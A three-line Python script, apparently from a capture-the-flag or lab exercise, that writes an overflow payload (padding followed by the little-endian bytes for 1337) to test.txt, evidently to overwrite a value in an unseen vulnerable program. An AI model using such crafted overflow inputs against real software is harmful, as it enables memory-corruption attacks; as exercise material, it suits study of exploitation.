payload = ("@." + ("." * 10) + ("\x39\x05\x00\x00")).encode()
with open("test.txt", "w") as f:
    f.write(payload.decode())